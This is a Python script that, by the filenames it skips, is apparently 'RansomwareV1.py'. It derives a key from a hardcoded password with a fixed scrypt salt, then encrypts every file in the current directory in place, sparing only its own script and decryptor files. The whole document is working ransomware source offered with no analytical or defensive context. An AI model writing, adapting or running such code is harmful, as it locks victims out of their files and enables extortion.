import os
import base64
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.backends import default_backend
from cryptography.fernet import Fernet

def DeriveKey(passwordParam):
    if type(passwordParam) == str:
        passwordParam = passwordParam.encode("utf-8")
    KDF = Scrypt(
        salt=b'ABCDEFGHIJKLMNOP',
        length=32,
        n=2**14,
        r=8,
        p=1,
        backend=default_backend()
    )
    deriveKey = KDF.derive(passwordParam)
    key = base64.urlsafe_b64encode(deriveKey)
    return key

def Encrypt(chunkParam, passwordParam: str):
    convertChunkToString = False
    if type(chunkParam) == str:
        chunkParam = chunkParam.encode("utf-8")
        convertChunkToString = True
    key = DeriveKey(passwordParam)
    fernet = Fernet(key)
    encryptedChunk = fernet.encrypt(chunkParam)
    if convertChunkToString == True:
        encryptedChunk = encryptedChunk.decode("utf-8")
    return encryptedChunk



def EncryptFile(fileNameParam: str , passwordParam: str) -> None :
    with open(fileNameParam,"rb") as fileObject:
        fileContent = fileObject.read()
        encryptedFileContent = Encrypt(fileContent,passwordParam)
    with open(fileNameParam,"wb") as fileObject:
        fileObject.write(encryptedFileContent)


password = "2o9aQjoyRNTyTbp" # Optional Password. WARNING!! The decryption software must also have the same password.

for file in os.listdir():
    fileName = file
    if fileName == "RansomwareV1.py" or file == "RansomwareDecryptV1.py" or file == "RansomwareDecryptV1.exe" or file == "RansomwareV1.exe":
        continue
    if os.path.isdir(fileName) == True :
        continue
    EncryptFile(fileName, password)




